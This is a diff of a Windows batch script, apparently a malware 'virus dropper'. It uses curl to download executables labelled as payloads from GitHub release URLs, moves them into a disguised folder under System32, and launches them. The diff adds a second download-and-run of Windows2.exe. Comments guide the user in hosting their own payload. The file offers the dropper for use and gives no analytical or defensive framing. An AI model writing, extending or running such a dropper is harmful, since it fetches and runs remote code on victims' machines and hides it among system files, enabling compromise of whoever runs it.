@@ -26,11 +26,13 @@ cls
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
 curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.exe" --output "%appdata%\Windows.exe"
+curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows2.exe" --output "%appdata%\Windows2.exe"
 ::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
 cls
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+move "%appdata%\Windows2.exe" "%systemroot%\System32\Windowsexe"
 cls
 
 
@@ -42,8 +44,6 @@ cls
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 cls
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
-cls
-copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 cls
 start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 cls
